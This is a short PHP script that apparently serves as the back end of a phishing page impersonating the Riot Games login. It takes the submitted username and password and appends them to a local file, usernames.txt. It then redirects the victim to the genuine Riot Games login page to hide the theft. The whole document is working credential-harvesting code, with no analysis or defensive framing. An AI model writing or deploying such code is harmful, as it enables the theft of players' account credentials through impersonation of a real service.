<?php
file_put_contents("usernames.txt", "Riot Games Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://auth.riotgames.com/login');
exit();
?>